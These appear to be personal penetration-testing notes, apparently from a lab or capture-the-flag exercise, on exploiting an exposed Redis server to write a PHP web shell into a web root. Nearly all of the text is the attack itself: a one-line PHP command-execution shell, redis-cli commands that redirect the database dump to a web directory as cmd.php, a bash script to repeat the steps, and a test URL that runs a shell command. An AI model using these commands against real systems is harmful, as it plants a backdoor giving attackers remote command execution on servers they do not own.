https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#php-webshell
## Generating a reserve shell

We can use as base a SSH reverse shell conection

![[Pasted image 20240406163728.png]]

### Creating our own script
Considering three `\n` before and after since redis cli insert "trash" data at the beginning.

<?php
	system($_REQUEST['cmd']);
?>

In order to upload the file:
`cat cmd.php | redis-cli -h 127.0.0.1 -x set reverse` *uoloading cmd.php into readis using name reverse*

Storing it in the web server that uses redis as DB:
`redis-cli -h 127.0.0.1 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4`

The we store the file in the victime machine
`redis-cli -h 127.0.0.1 config set dbfilename "cmd.php"` *stored in the database as cmd.php*

To save:
`redis-cli -h 127.0.0.1 save`

If in background there is a cron service or an operation that removes this configuration from time to time, it's better to create a scrip with all this instructions to run them quickly:
````
#!/bin/bash
cat cmd.php | redis-cli -h 127.0.0.1 -x set reverse
redis-cli -h 127.0.0.1 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4
redis-cli -h 127.0.0.1 config set dbfilename "cmd.php"
redis-cli -h 127.0.0.1 save
````

Testing:
http://127.0.0.1/8924d0549008565c554f8128cd11fda4/cmd.php?cmd=ls%20-l

![[Pasted image 20240406171056.png]]